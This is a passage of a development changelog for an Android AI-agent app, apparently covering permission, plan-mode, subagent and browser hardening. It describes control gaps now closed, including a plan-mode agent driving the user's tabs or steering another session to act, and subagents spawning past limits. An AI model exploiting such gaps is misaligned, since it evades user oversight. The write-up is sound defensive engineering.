| 10 | The injected shim answered every `window.confirm()` with `true`, on pages the user browses by hand | `confirm` now **fails closed** (`false`) while still recording the prompt; `prompt` returns `null` instead of the default value. Nothing destructive happens behind the user's back. |
| 11 | Any non-http scheme was handed to the OS from `onNavigationRequest`, which fires for JS-initiated navigations — a page could fire `whatsapp://send` with no gesture | New `_externalLaunchSchemes` allowlist (`mailto`, `tel`, `sms`, `geo`) **and** a `request.isMainFrame` requirement; everything else (including `data:`) is prevented and reported. |
| 12 | Any `startForegroundService` call acquired a renewable 6-hour `PARTIAL_WAKE_LOCK` — including the idle "Ready & Listening" update and the boot start, with keep-alive defaulting ON | New `EXTRA_WAKE` flag: Dart sends `wake` on every start/update (`true` only from `agentWorking`), the service tracks `wantWakeLock` across `START_STICKY` restarts, acquires only when true, releases on `ACTION_STOP`, and `onTaskRemoved` re-acquires only if a run is in flight. The boot start carries no extra, so boot never takes the lock. |
| 26 | Six Hinglish strings in security-critical consent dialogs and timeout errors | Device-permission, `browser_open`, `browser_navigate`, `browser_new_tab` approval copy and both provider-timeout errors are now English. |

New tests: `test/readonly_command_security_test.dart`, `test/browser_scheme_guard_test.dart`,
`test/wake_lock_contract_test.dart`. Updated contracts: `test/git_credentials_test.dart`,
`test/studio_git_reliability_test.dart` (both pinned the token-in-env design),
`test/session_browser_profiles_test.dart` (pinned the cookie-merge default),
`test/core_regression_test.dart` (destructive killers + spared list).

One source-pin window widened: `navigateTab binds the profile before its own
load` searched a fixed 1200-char slice, which the new scheme guard pushed past
`loadRequest` — the assertion had silently degraded to testing nothing
(`loadIndex == -1`). Now 3000 chars, and it additionally pins that the guard
runs *before* the profile bind.

Verification: `dart analyze lib test` 0 issues · full suite **2363 pass, 1 skipped**
(baseline 2335) · `:app:compileDebugKotlin --offline` BUILD SUCCESSFUL.

Note: `CTRL6` failed once under full-suite parallel load and passed both in
isolation and on a full-suite re-run — the same 30 s per-test default-timeout
flakiness previously seen in `studio_git_reliability_test.dart`, not a
regression from this phase.
| 3 — Studio login + clone-once + label | partial | see below | label + login restore + **clone-once gaps 1 and 4** done (plus a newly found save race); gaps 2, 3, 5, 6 remain |
| 4a — Browser geometry | **done** | see below | real 1280×800 layout; verifier made honest |
| 4b — CDP | deferred | — | D2 |
| 5 — Accessibility restart | **done** | see below | stale-bind signal, cold-start probe, honest copy, screenshot capability |
| 6 — Plan mode allowlist | **done** | see below | blocklist → allowlist, default-deny |
| 7 — Subagents 49 + no nesting | **done** | see below | cap + zero nesting + ledger FD fix (#8) |
| 8 — Codex parity | **done (config paths)** | see below | TOML MCP mounting, transport, allowlist, roots, marketplace; AGENTS.md injection still open |
| 9 — Correctness & leaks | partial | see below | #8 #14 #16 #18 #29 done; #9 #13 #15 #17 #19 remain |
| 10 — Performance | partial | see below | #20 (theme + root listener + stream coalescing) and #25 done; #21 #23 #24 remain |
| 11 — UI/UX + queue dock | partial | see below | queue dock, Hinglish, **tab-close target, agent-dot semantics** done; 4 smaller targets remain |
| 12 — Google Doc | deferred | — | D1, awaiting URL |

### Phase 7 detail — 49 ceiling, zero nesting, no leaked descriptors

**Ceiling.** `_maxConcurrentSubagents = 49`, enforced at all three spawn sites —
`_handleDispatchAgent`, `_spawnChild` (which serves `workflow`'s 6-way fan-out
and `ralph`), and `continueSubagent` (resuming a settled child makes it live
again, so a resume storm could otherwise push past the cap). The check is
**per parent session** (the owner's requirement) with a global net at the same
number, because the resources that break are process-wide: one main isolate
carrying every SSE stream, one FD table, one SharedPreferences blob rewritten on
every child's row.

It is atomic by construction: `_handleDispatchAgent` has no `await` between the
check and `_subagents[id] = sub`, so in a single-threaded isolate a wide fan-out
in one turn cannot overshoot. Restored handles from a cold start are
`finished = true` and never consume budget.

**Zero nesting**, three independent layers:
1. `_childDeniedTools` gains `dispatch_agent`, `workflow`, `ralph` — the dispatch
   gate refuses them for any child.
2. The `_tools` roster strips them when `_runSession.isSubagent`, so a child
   never even sees them and cannot plan around the refusal.
3. An `isSubagent` refusal at each spawn site, keyed on durable lineage so a
   fresh service instance cannot escape it.

`_maxSubagentDepth` stays as defence in depth. Management tools
(`send_message`, `list_agents`, `interrupt_agent`, `report`) remain in a child's
roster — a child must still coordinate with its parent and siblings. The root
roster is untouched, so `token_budget_test.dart` still passes.

**Ledger FD leaks (#8), fixed as the prerequisite for raising concurrency:**
- `_sinks` became `Map<String, Future<IOSink>>` with a synchronous
  check-and-insert. Two concurrent first-appenders used to both `openWrite` and
  the loser was orphaned — never flushed, never closed: one leaked descriptor
  per fresh session, which at 49 concurrent children is 49 per fan-out.
- A **rejected** open is evicted from the map rather than cached, so a transient
  failure (path_provider unavailable, disk full) does not poison that session's
  ledger for the rest of the process; the handler also marks the error observed
  so it cannot surface as an unhandled async error. This regression was caught
  by `session_stop_isolation_test.dart` during development.
- `close()` now calls `close()` (which implies flush **and** releases the
  descriptor) instead of `flush()` followed by deleting the file underneath the
  still-open handle — every session deletion previously leaked one descriptor to
  an unlinked inode, forever.
- The subagent mirror's `card.toolDetail` is capped at 12k like every other tool
  stream; it is serialized into the session JSON and re-split on every build.

New tests: `test/session_ledger_fd_test.dart` (one sink per session under 40
concurrent appends, no lost events, close releases and resets),
`test/subagent_ceiling_test.dart` (admission flips exactly at 49, finished
handles free budget, dispatch refused at the ceiling spawning nothing, nesting
refused, child roster lacks the spawn tools but keeps the management ones).
`core_regression_test.dart`'s depth-cap test was rewritten: it asserted only the
depth limit, which permitted one nesting level — it now asserts no subagent may
spawn another at any depth.

### Phase 4a detail — desktop mode gets real geometry

`_SizedBrowserView` (new, `lib/ui/browser_screen.dart`) now frames each tab: a
mobile tab fills the space exactly as before, a desktop tab is laid out at
**1280×800 logical pixels** and scaled to fit via `FittedBox(fit: contain)`
inside an `InteractiveViewer` (pinch-zoom, without which a 1280px page on a
400px screen is unreadable).

`FittedBox`, not `Transform.scale`, is the correct primitive: it lays the child
out with unbounded constraints at its own size and scales the paint, so a
1280-wide child inside a 360-wide parent is not a layout overflow.

Because the native view is now genuinely 1280 CSS px wide, `width=device-width`
resolves to 1280 and media queries, `vw`/`vh`, `innerWidth` and `visualViewport`
all become truly desktop — the JS shim, the injected viewport meta and the
repair loop are no longer load-bearing. They were left in place for this pass
(removing them breaks six test files that pin their source strings); they are now
redundant and should be deleted in a follow-up. `browserDesktopLogicalSize` is
exposed as a test seam and is asserted to stay in lockstep with
`BrowserTab.desktopLogicalWidth/Height`, which is what the native side
advertises — if those diverge, the page's own layout logic contradicts the
metrics it reads back.

**Honesty fix:** `_verifyDesktopForced` logged *"desktop force repaired: layout
1280px re-applied"* whenever the channel call merely succeeded, without ever
measuring anything — so a no-op repair (the injected meta losing to the page's
own `width=device-width`) was reported as a success. It now re-probes
`clientWidth` after the repair and logs the width actually observed, with a
distinct warning when the layout is still phone-sized.

**Still owed (cannot be done without a device):** on-device confirmation that
Chromium reports `document.documentElement.clientWidth == 1280`. A widget test
proves the Flutter geometry; only the clientWidth probe proves what Chromium
does with it. This is the single highest-value manual check in the whole plan —
`audits/2026-09-10-browser-desktop.md` §7 records that desktop mode shipped
without ever being executed on a device.

New test: `test/browser_desktop_geometry_test.dart` — a desktop tab is laid out
at exactly 1280×800 with a `BoxFit.contain` frame and an `InteractiveViewer`; a
mobile tab has no such frame; toggling the mode switches the laid-out size.

### Phase 9 (partial) — approval readiness is a mount count

Defect #14. `AgentService.approvalUiReady` was a single static bool set in
`ChatScreen.initState` and cleared in `dispose`. During a navigation overlap the
outgoing screen's `dispose` runs *after* the incoming one's `initState`, clearing
the flag while a fully visible approval UI was mounted — so `_askUser` treated
pending approvals as unanswerable and **auto-denied them after 5 s instead of
120 s**, under a card the user could still tap. It was also process-global, so
one hidden chat pane shortened the grace for every session's run. Now a mount
count (`markApprovalUiMounted` / `markApprovalUiDisposed`), which makes
overlapping lifecycles cancel out correctly and can never go negative. The
legacy `approvalUiReady = bool` assignment form still compiles for existing call
sites.

New test: `test/approval_ui_ready_test.dart`, including the exact regression —
mount, mount, dispose-one must leave readiness **true**.

### Test-infrastructure note

`test/git_clone_registry_test.dart` wrapped each dispatch in an explicit
`.timeout(const Duration(seconds: 30))`. That is a hang guard, not a performance
budget (the dispatch completes instantly when the file runs alone), and under
full-suite parallel load it fired spuriously — a recurring phantom failure that
`dart_test.yaml` cannot fix, because an in-body `.timeout()` overrides the suite
default. Raised to 2 minutes.

`dart_test.yaml` also raises the per-test timeout from package:test's 30s default to
3m. The suite is 2400+ tests run in parallel across files; on a loaded machine
the slow ones (real git operations, large-history widget pumps) exceeded 30s and
failed with a `TimeoutException` that vanished when the file ran alone. That
produced recurring phantom failures — `studio_git_reliability_test.dart`, then
`git_clone_registry_test.dart`, then `core_regression_test.dart` CTRL6 — each
previously "fixed" by annotating one more test. Full-suite wall time dropped from
7:29 to 3:59 once nothing was hitting the timeout.

### Phase 5 detail — accessibility survives a restart, or says why it cannot

The ordinary case already self-healed: `AccessibilityManagerService` rebinds an
enabled service after a normal process death and `onServiceConnected`
republishes the static `instance`. The case that never healed is a **force-stop**
(the package enters the stopped state and the system will not restart its
services) or an **OEM autostart blocker** — the service stays listed in
`Settings.Secure`, so Settings still shows it ON, while `instance` is null for
the whole process lifetime. `cfc44f0` had removed the only programmatic repair
(correctly: toggling the component makes the system *drop* it from
`Settings.Secure` permanently) but left pure waiting and no honesty about it.

- **Native** (`MainActivity.deviceServiceState`) gained a fourth state,
  `connecting_stale`: enabled in Settings, unbound, and the process has been up
  longer than a 60 s rebind grace. That is the only way to tell "the OS is still
  working on it" from "the OS will never rebind it".
- **`deviceService()`** now returns `SERVICE_STALE` (with the toggle
  instruction) instead of `SERVICE_CONNECTING` for that state, so Dart stops
  retrying something terminal.
- **Dart** `_invokeGuarded` fails fast on `SERVICE_STALE` rather than burning the
  90 s budget; `staleBindingDetected` is published for the UI and cleared when
  the service binds. `_connectingExhaustedError` re-reads the state and tells the
  truth: the old copy ended in "Wait a moment and retry — it should bind on its
  own" for *every* non-disabled state, which is exactly the false promise that
  sent users in a circle.
- **Cold start** now probes. A new `device.serviceBinding` readiness task calls
  `refreshServiceBinding()`; kind `localState` so the coordinator can never
  deadline-skip it. Previously the only trigger was
  `AppLifecycleState.resumed`, which Android dispatches from
  `FlutterActivity.onResume()` *before* `runApp` — so the shell's late-registered
  observer never received it and nothing ran on a cold start at all.
- **UI**: `_ControlServiceNotice` read `isEnabled()` (Settings-level, returns
  `true` in the stuck state), so the one row that could have offered a toggle
  never rendered. It now reads `serviceState()` and renders a distinct
  "On in Settings but Android has not restarted it — toggle it off and on" row
  with the Settings action.
- **`android:canTakeScreenshot="true"`** restored to
  `ovid_accessibility_service.xml`. `AccessibilityService.takeScreenshot()`
  requires it, so `device_screenshot` failed unconditionally on API 30+; the
  2026-09-06 plan template included the attribute and the shipped file had lost
  it.

No programmatic component toggle was reintroduced, and a test pins that
`setComponentEnabledSetting` stays absent from `MainActivity.kt`.

New test: `test/accessibility_stale_bind_test.dart` — state pass-through and
fail-closed, stale clears on bind, one call and no retry loop on
`SERVICE_STALE`, an exhausted *connecting* budget re-reads state and returns the
toggle copy (while a genuinely slow rebind still gets the patient message), and
source contracts for the startup task, the XML capability and the notice.

### Phase 3 (partial) — Studio login survives a restart

Two independent paths lost a valid login; both are closed.

**A failed storage read is no longer reported as "signed out".**
`readTokenWithRetriesForTest` retried 3× over ~300 ms and then returned `null`,
which `initialize()` could not distinguish from reading an empty key — so Studio
showed logged-out for the whole launch while the token sat intact on disk. On
Android a Keystore / EncryptedSharedPreferences read can fail far longer than
300 ms (cold-start contention, an OS update, a damaged Tink keyset), which is
exactly why the report was intermittent and "fixed itself" next launch. The
helper now records `lastReadFailedForTest`, surfaced as the instance flag
`restoreFailed`, and:

- `initialize()` sets `restoreFailed`, clears `_isInitializing` and arms
  `_scheduleRestoreRetry` (5 s → 30 s → 2 min) instead of concluding signed-out;
- `retryRestoreIfNotLoggedIn()` re-reads and restores the login with no user
  action, then loads the profile tolerantly (a profile failure can never put the
  restored token at risk);
- `shell.dart` calls it on `AppLifecycleState.resumed`;
- `studio_screen.dart` declines to latch `_handledInitialAuth` while
  `restoreFailed`, so the sign-in sheet is not shown over a session that is about
  to come back — and is still offered later if it does not.

**A freshly issued token is never discarded.** `_persistToken` re-checked the
auth generation *inside* the queued write: it skipped the write, and then
**deleted the token it had just written**, whenever a concurrent `initialize()`
bumped the generation while the write sat in the queue. A successful device-flow
sign-in therefore survived only for that process lifetime. Writes are now
unconditional — a newly issued token is the newest fact about the account —
because staleness is already gated at the call site by `ensureCurrent()`, and a
queued `signOut()` clear always runs after the write it supersedes.

Also: `deleteAllData()` now calls `GitHubService.I.signOut()` before wiping
secure storage, so memory and disk stop disagreeing (the Studio UI previously
kept rendering signed-in until the next restart).

Not done: the profile (`@login`, avatar) is still not persisted, so the account
chip renders empty while offline even though the token is valid — cosmetic, but
it reads as a logout.

New test: `test/github_login_restore_test.dart` — throw-vs-empty read
distinction, retry-and-recover, no-op when logged in, the `_persistToken` code
shape that caused the race, sign-out still clears storage, and the three caller
contracts (Studio latch, resume retry, delete-all-data ordering).

### Phase 3 (continued) — clone-once gaps 1 and 4, plus a save race

**Gap 1 — the reported "baar baar clone".** `git_clone` routed through the shared
registry only when `mode == AgentMode.studio`. But `newSession()` never sets a
mode and `ChatSession` defaults to `'auto'`, so every freshly created chat
session took the raw per-session path and cloned the same repo again into
`ws_<id>`. Routing now triggers on `mode == studio` **or** the URL matching the
session's connected repo (`sessionRepoFull`, case-insensitive), so a new session
reuses the global clone. An unrelated repo still takes the raw path — the
registry is not a blanket hijack.

**Gap 4 — `ensureCloned` had no in-flight dedup.** Two concurrent callers both
missed the index; the second found the first's in-flight directory on disk and
ran `delete(recursive: true)` on it, so the first failed and deleted again —
a spurious "Clone failed" and sometimes two clones. Concurrent callers for one
key now share a single `Future`, evicted on completion *either way* so a failure
does not poison the key.

**Newly found: the index save was not concurrency-safe.** Writing the dedup test
exposed it. `_save()` used a fixed `repo_index.json.tmp`, so two concurrent
saves (different branches, or a clone racing a `bindSession`) collided on the
rename — the second threw `PathNotFoundException`, or with different timing
persisted a payload captured before the other write and silently dropped a repo
or binding from the index. Saves are now serialized on a queue and use a unique
temp name per save, cleaned up in a `finally`.

New tests: three concurrent callers share one clone; a failed clone does not
poison the key; four concurrent clones of different repos all land in the
persisted index with no temp files left behind; a General-mode session cloning
its connected repo reuses the registry; **three successive new sessions produce
exactly one clone**; an unrelated repo does not hit the registry.

### Remaining in Phase 3

(2) the branch picker rebinds the API `RepoCache` but never the git clone;
(3) `_offerCloneTarget` early-returns on an inherited folder, so switching repo
A→B keeps working in A; (5) the registry binding and the pinned
`workspaceFolder` disagree, so agent cwd ≠ terminal cwd; (6) the first-selected
branch is not recorded per repo. Gap 5 matters most for Phase 2, which needs one
authoritative Studio root.

### Phase 2 detail — strict per-mode permissions

**Mode-tagged decisions.** `PermissionGrant` gained `mode` (the AgentMode name it
was made in) and `decision` (`always` | `deny`). Matching is now mode-scoped
everywhere: `grantsFor`, `isPathGranted`, `isHostGranted` all take a `mode`, and
`_modeMatches` requires an exact match. **This is what makes the modes unable to
conflict** — before, the store had no mode dimension, so a path granted while a
session was in Studio stayed fully in force after the same session switched to
General.

Persistence stays in the session JSON (`grants`) plus the app-level
`ovid_permission_grants_v1`, which already gives exactly decision D3: entries
survive restart and are purged when the session is deleted. A second per-mode
file store was deliberately NOT added — it would duplicate the same facts in two
places and drift. The mode tag delivers the isolation the owner asked for; the
Permissions screen can group by mode from the same data.

**Legacy migration.** Entries written before mode tagging have an empty `mode`
and are honoured in **General only** — the most conservative reading of a
decision whose mode is unknown. Documented in `GrantStore.legacyModeFallback`.

**Denials are now persisted** (`addPathDeny` / `addHostDeny`, `isPathDenied` /
`isHostDenied`), and **a recorded deny always wins over a recorded allow** —
otherwise a stale "always allow" would silently override the user's later, more
specific refusal. Recording a deny also removes any allow on the same
value+mode. Per the "exactly three options" rule the Deny button does **not**
write one (that would be a fourth, "always deny" choice); the capability is
there for the Permissions screen and for future use.

**Control mode is jailed.** It shared Full Access's exemption in both the path
and host gates, so a Control session could read and write anywhere on the device
with no prompt. It now uses `permissionWorkspaceRoot` like General/Read-Only and
prompts for anything outside the session directory. Its *device* tools still
auto-approve — a prompt per tap would make the mode unusable — because the
filesystem and network jails are what the requirement is about.
`permissionWorkspaceRoot` is no longer a stub: it returns an empty root for
`drive` (meaning "no jail", which callers must honour) and the session workspace
for every other mode.

**Exactly three actions.** The approval card lost the fourth "Deny with a note"
icon button and the `This session` / `All sessions` scope chips: Deny / Allow /
Always Allow, and an Always Allow is recorded for that mode and that session by
construction, so there is no scope left to choose. `_denyWithNote` and
`_globalScope` are gone (`AgentService.approve(false, note:)` remains for
programmatic callers). Cards for irreversible actions (destructive commands,
plugin installs, device permissions, plan review) still offer no Always Allow —
that safety property is unchanged.

**Mode captured at prompt time.** `ApprovalRequest` gained `modeName`, set in
`_askUser`. `approveAlways` runs from the UI, outside any run zone, so reading
the `mode` getter there would resolve to whichever session is foreground and tag
the grant with the wrong mode — wrong with parallel sessions, which this app
explicitly supports. `_alwaysAllowedTools` is likewise keyed
`"<sessionId>|<mode>"` now, and `dropSessionRun` clears every mode variant.

**Bug found and fixed while wiring it:** `AppState.addGlobalPermissionGrant`
rebuilt the entry from kind/value/scope only, silently **dropping the mode tag**
— so every global grant became mode-less and the mode-scoped match never saw it.
It now preserves `mode` and `decision`, and its dedup identity includes both, so
an allow and a deny on the same value can coexist.

New tests: `test/permission_mode_isolation_test.dart` (13 — cross-mode invisibility,
same path in two modes as two decisions, hierarchical coverage, legacy fallback,
deny-overrides-allow, deny not bleeding across modes, host parity, real roots per
mode, JSON round-trip, unknown-decision rejection) and two agent-level cases in
`tool_approval_always_allow_test.dart` (Control prompts for an outside path;
a Control grant does not carry into General after a mode switch).
`git_clone_registry_test.dart` grants are now mode-tagged, matching how
production creates them.

Still open from the Phase 1 deferrals: `checkPolicy` jails cwd rather than
canonicalised command *targets*, and loopback is still silently allowed in
`defaultAllowedHosts`.

### Phase 8 detail — Codex config paths now reach production

Codex plugin *bundles* already worked. What was missing was the Codex
*ecosystem config* — and in every case the capability existed but no production
code path reached it.

- **`mountPluginMcpServers` read only `.mcp.json` through a raw `jsonDecode`**, so
  a Codex plugin declaring servers in `config.toml` under `[mcp_servers.<name>]`
  mounted **nothing, silently**. It now tries `.mcp.json` then `config.toml`,
  both through `parseMcpConfig` (which sniffs JSON vs TOML), normalised into one
  map shape by a new `importedMcpToMap`. `.mcp.json` wins a name collision as the
  more specific declaration.
- **`type = "streamable-http"`** — Codex's spelling of the remote transport —
  survived parsing and fell through to the stdio branch, dying with the
  misleading *"declares no command"*. New `normalizeMcpTransport` maps every
  variant (`streamableHttp`, `streamable_http`, `http-streamable`, SSE spellings)
  at parse time, so all consumers see one spelling.
- **The legacy install allowlist was Claude-shaped** and staged **zero** files
  from a Codex tree. It now accepts `config.toml`, `AGENTS.md`,
  `.codex-plugin/plugin.json`, `.codex-plugin/marketplace.json`, `.agents/**` and
  `.codex/**`.
- **Workspace roots**: `.codex/` was recognised for `skills` only, so a repo
  carrying `.codex/commands` or `.codex/agents` exposed nothing while its
  `.claude/` equivalent worked. Added `commands`, `prompts` and `agents`, plus
  the matching `_pathMatchesKind` cases.
- **Marketplace discovery** probes `.codex-plugin/marketplace.json`,
  `.codex/plugins/marketplace.json` and `.codex/marketplace.json`; a Codex
  marketplace previously failed with "No marketplace.json found".
- **`${CODEX_PLUGIN_ROOT}`** added to `kPluginRootVariables` and exported in both
  the hook env and the MCP server env — expanding the variable is useless if the
  child process cannot see it.

**A green test was pinning the gap as correct behaviour.**
`plugin_runtime_skills_test.dart` asserted that a manifest-*declared*
`.codex/agents/rogue.md` must NOT mount. Inverted: a declared `.codex` agent and
command now mount, while `.agents/commands/` (not a convention any harness uses)
stays unmounted.

Still open: `AGENTS.md` is collected into `instructionPaths` and never consumed
(plan blocker B6); `_parseCodexInlineHooks` has no tests and misses quoted keys
(`[[hooks."SessionStart"]]`); `CodexPluginAdapter` does not scan top-level
`commands/`, `agents/` or root `skills/`; `importMcpFromSettings` still has no
production caller; and there is no paste/import UI for a config file, which is
the only realistic way to get a Codex `config.toml` onto a device (nothing creates
`~/.codex/` in the sandbox home).

New test: `test/codex_parity_test.dart` (11) — transport normalisation, a real
Codex `config.toml` parsing into stdio/http/env-bearing servers, JSON through the
same entry point, and source contracts for each wiring point above.

### Perf / a11y / leak batch

**#20 — every streamed token rebuilt the whole app.** Two causes, both fixed:
`Aether.theme()` constructed a fresh `ThemeData.dark()/light()` plus a full
`copyWith` on *every call*, and `_OvidAppState` — the root — listened to all of
`AppState`, which notifies per token. The theme is now cached per light/dark
value (`resetThemeCacheForTest` for tests), and the root listener compares
`Aether.dark` before rebuilding, so a token no longer invalidates `MaterialApp`,
its theme and every route. Stream-driven refreshes are additionally coalesced
through a leading-edge throttle with a guaranteed trailing flush (~60 Hz instead
of one per token), and all three live-message finalizers flush so the last token
is never left unpainted and no timer outlives its turn.

**#25 — Studio terminal `history` grew without bound.** A long-lived tab running
apt/npm/gradle accumulated tens of thousands of strings. Trimmed to the newest
5000 lines inside `_notify()`, which covers all five append sites at once.

**#16 — `setState` after `await` with no `mounted` guard** in the code-block copy
button (`chat_screen.dart`) and the Health screen's sandbox reset, which checked
`mounted` one line *after* calling `setState`.

**#18 — three leaked `TextEditingController`s** created for dialogs and never
disposed: sidebar rename, the preset Duplicate sheet (two controllers, read after
the dialog so the values are captured first), and the image-prompt dialog.

**#29 — the rename dialog's IME action key was a dead end.** `textInputAction:
done` plus `onSubmitted` sharing one `save()` with the Save button.

**#27 (worst offender) — the browser tab-close button was a bare 12×12dp icon**
in a `GestureDetector` ~5px from the tab body: the easiest mis-tap in the app had
the worst outcome (closing the wrong tab) and TalkBack had nothing to announce.
Now a 32×32 opaque hit area with `Semantics(button: true, label: 'Close tab')`.

**#28 — `_AgentDot` encoded busy/idle by colour alone.** Now carries a `Tooltip`
and `Semantics` label ("Agent is driving this tab" / "Agent idle on this tab").

New test: `test/perf_and_a11y_fixes_test.dart` (6) — theme cache identity and
invalidation on a light/dark flip, the flush seam, the history cap keeping the
*newest* lines, and widget tests for the tab-close hit area/label and the dot's
announced state.

### Verification (current)

`dart analyze lib test` → 0 issues · full suite **2456 pass, 1 skipped** ·
`:app:compileDebugKotlin --offline` → BUILD SUCCESSFUL · CI green through
`75ef982`.

### Phase 6 detail — plan mode is now default-deny

`_mutatingTools` (a 56-name blocklist) is gone, replaced by
`_planModeAllowedTools` — an allowlist of read/search/plan tools. Anything
unlisted is refused with the existing `PLAN MODE ACTIVE` message, which now also
points the model at `todo_write` and `exit_plan_mode`.

Closed escapes: `browser_open`, `browser_navigate`, `browser_new_tab`,
`browser_close_tab`, `browser_switch_tab`, `browser_back`, `browser_forward`,
`browser_reload`, `browser_resize`, `browser_scroll`, `browser_hover` (a
"planning" agent could open, drive and **close the user's tabs**), plus
`interrupt_agent` and `send_message` (it could stop or steer *another* session —
which is not in plan mode — into doing the mutation).

Deliberately excluded from the allowlist: all `device_*` tools, every
`plugin_*` / canonical plugin call and MCP tool (arbitrary third-party code
whose effect cannot be known statically), `preview` / `generate_image` (they
write files), and the native content tools that can send (`sms`, `phone`,
`contacts`, `calendar`). `todo_write` moved from blocked to allowed — the plan
artifact is the point of plan mode, and Read-Only mode already allowed it for
the same reason.

New test: `test/plan_mode_allowlist_test.dart` — including the case that matters
most, that a **tool added in a future release is refused by default** (a
blocklist would have allowed it).

### Phase 3 (partial) — chatbox repo label

`_StudioFolderChip` preferred `workspaceFolder.split('/').last`, which for a
registry clone is `<owner>__<repo>__<branch>` — so the chip read
`aasheesh333__OvidAI__main`. The repo name now wins and the folder basename is
only a fallback for a pinned local folder with no repo connected. Pinned by a new
widget test asserting `find.textContaining('aasheesh333')` is `findsNothing`.

### Phase 11 (partial) — queue dock height

Rows still auto-size to their text (the owner's "height auto-adjusts per text
lines", and the existing `maxLines == null` contract is untouched). What shrank
is the chrome and the ceiling: rows region **38% → 24%** of viewport, container
vertical padding 8 → 5, header gap 6 → 3, row gap 4 → 2, `_QueueAction` vertical
padding 12 → 9 (width stays 48 so the tap target is still easy to hit). A
one-line queued message went from ~44dp to ~36dp of row height.
`test/queue_dock_layout_test.dart` now asserts a ceiling below the old 38% so it
cannot silently grow back.

Verification after Phases 1 + 6 + the two partials: `dart analyze lib test`
0 issues · full suite **2373 pass, 1 skipped** · `:app:compileDebugKotlin`
BUILD SUCCESSFUL (checked after Phase 1).

Test count at baseline: to be recorded in Phase 0.
